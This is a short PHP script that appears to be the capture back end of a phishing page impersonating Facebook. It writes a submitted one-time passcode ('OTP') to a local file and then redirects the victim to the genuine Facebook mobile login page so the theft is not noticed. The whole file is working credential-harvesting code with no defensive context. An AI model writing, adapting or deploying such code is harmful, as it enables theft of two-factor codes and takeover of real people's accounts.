<?php

file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2FJUST-FUN-106475094061167%2F%3Frefsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F106475094061167%252F%26_rdr&email=&li=FCR8Xy7eDhgQ8ZgEwp1wXIRH&e=1348092&shbl=1&ref=104&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F106475094061167%2F&_rdr');
exit();
